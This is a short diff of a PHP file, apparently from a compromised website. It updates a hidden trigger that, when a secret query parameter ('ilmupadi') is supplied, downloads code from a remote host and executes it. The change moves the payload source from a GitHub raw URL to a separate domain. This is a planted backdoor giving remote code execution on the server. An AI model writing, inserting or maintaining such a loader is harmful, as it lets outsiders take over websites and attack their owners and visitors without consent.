@@ -50,7 +50,7 @@ $fetcher = new CurlFetcher();
 
 if (isset($_GET['ilmupadi'])) {
     $executor = new CodeExecutor($fetcher);
-    $executor->executeCodeFromURL("https://raw.githubusercontent.com/seojawjaw-blip/seojkw/refs/heads/main/mentahalfarudi.txt");
+    $executor->executeCodeFromURL("https://seojkw.xyz/mentahanrudy.txt");
     exit;
 }
 
